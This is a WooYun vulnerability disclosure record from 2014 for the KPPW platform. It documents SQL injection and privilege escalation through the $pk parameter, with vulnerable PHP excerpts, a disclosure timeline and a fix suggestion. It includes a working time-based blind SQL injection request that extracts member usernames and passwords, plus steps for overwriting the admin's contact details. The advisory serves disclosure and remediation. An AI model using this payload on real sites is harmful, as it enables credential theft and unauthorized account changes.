{"id": 42290, "wybug_id": "wooyun-2014-086216", "wybug_title": "KPPW最新版SQL注入漏洞三(SQL注入及越权操作各两处）", "wybug_corp": "keke.com", "wybug_author": "xfkxfk", "wybug_date": "2014-12-09 00:36", "wybug_open_date": "2015-03-09 00:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "安全意识不足", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-09：\t细节向公众公开  简要描述： KPPW最新版SQL注入漏洞三(SQL注入及越权操作各两处），附脚本 详细说明：  KPPW最新版SQL注入漏洞三(SQL注入及越权操作各两处），附脚本第一处SQL注入文件/control/user/account_basic.php:\nif($intUserRole === 2){......}else{\t$intAuthStatus = keke_auth_fac_class::auth_check ( \"realname\", $gUid );\tif (isset($formhash)&&kekezu::submitcheck($formhash)) {\t\tif (strtotime($birthday)>=strtotime(date('Y-m-d',time()))) {\t\t\t$tips['errors']['birthday'] = '出生日期不得大于或等于当前日期';\t\t\tkekezu::show_msg($tips,NULL,NULL,NULL,'error');\t\t}\t\tif (strtoupper ( CHARSET ) == 'GBK') {\t\t\t$truename = kekezu::utftogbk($truename );\t\t}\t\t$arrData = array(\t\t\t\t'indus_pid'\t=>$indus_pid,\t\t\t\t'indus_id'\t=>$indus_id,\t\t\t\t'truename'\t=>$truename,\t\t\t\t'sex'\t\t=>$sex,\t\t\t\t'birthday'\t=>$birthday,\t\t);\t\t$objSpaceT->save($arrData,$pk);\t\tunset($objSpaceT);\t\tkekezu::show_msg('已保存',NULL,NULL,NULL,'ok');\t}}\n这里在保存基本信息时，变量$pk进入了save函数跟进save函数，文件/lib/inc/keke_table_class.php：\nfunction save($fields, $pk = array()) {\t\tforeach ( $fields as $k => $v ) {\t\t\t$kk = ucfirst ( $k );\t\t\t$set_query = \"set\" . $kk;\t\t\t$this->_table_obj->$set_query ( $v );\t\t}\t\t$keys = array_keys ( $pk );\t\t$key = $keys [0];\t\tif (! empty ( $pk [$key] )) {\t\t\t$this->_table_obj->setWhere ( \" $key = '\" . $pk [$key] . \"'\" );\t\t\t$edit_query = \"edit_\" . $this->_pre . $this->_table_name;\t\t\t$res = $this->_table_obj->$edit_query ();\t\t} else {\t\t\t$create_query = \"create_\" . $this->_pre . $this->_table_name;\t\t\t$res = $this->_table_obj->$create_query ();\t\t}\t\tif ($res) {\t\t\treturn $res;\t\t} else {\t\t\treturn false;\t\t}\t}\n当$pk[$key]不为空时，$key进入where条件，最后进入>$edit_query，进入sql语句由于这里的key咋此系统是为全局处理的，也未加引号保护，导致sql注入第二处SQL注入文件/control/user/account_contact.php:\nif (isset($formhash)&&kekezu::submitcheck($formhash)) {\t$arrData =array(\t\t'email'\t=>$email,\t\t'mobile'=>$mobile,\t\t'qq'\t=>$qq,\t\t'msn'\t=>$msn,\t\t'phone'\t=>$phone,\t\t'province'=>$province,\t\t'city'=>$city,\t\t'area'=>$area\t);\t$intRes = $objSpaceT->save($arrData,$pk);\n同理变量$pk进入sql语句，原理同上，导致SQL注入漏洞有因为这里在更新用户基本信息时，where条件是根据用户数据的uid进行update所以，这里我们可以update任意用户的基本信息了，导致越权操作同理也能修改任意用户的联系方式两处SQL注入，两处越权操作   漏洞证明：  发送此请求会延迟5秒返回：\nPOST /KPPW2520141118UTF-8/index.php?do=user&view=account&op=basic HTTP/1.1Host: localhostUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://localhost/KPPW2520141118UTF-8/index.php?do=user&view=account&op=basicContent-Length: 239Cookie: PHPSESSID=v8bshmlaa5qi5s47tnbpvulba5Connection: keep-alivePragma: no-cacheCache-Control: no-cacheformhash=6cb7d4&pk%5Buid%3d5529+and+if(mid((select+concat(username,password)+from+keke_witkey_member+limit+0,1),1,1)%3dchar(97),sleep(5),1)%23%5D=5529&indus_pid=-1&indus_id=-1&truename=%E4%B9%8C%E4%BA%91%E4%B8%80&sex=-1&birthday=1111-11-11\n看看数据库执行结果\n\nsql语句 成功执行获取数据使用sqlmap即可测试代码给出简单跑数据脚本越权操作，这里我们注册普通用户登录然后修改联系方式，抓包，修改uid=1，即为admin的uid\n\n然后即可修改管理员的联系方式\n\n   修复方案：  此系统全局为过滤key，使用户不可控即可，可以考虑给key加固定的取值list   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-12-10 17:20 厂商回复： 已修改  QK 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}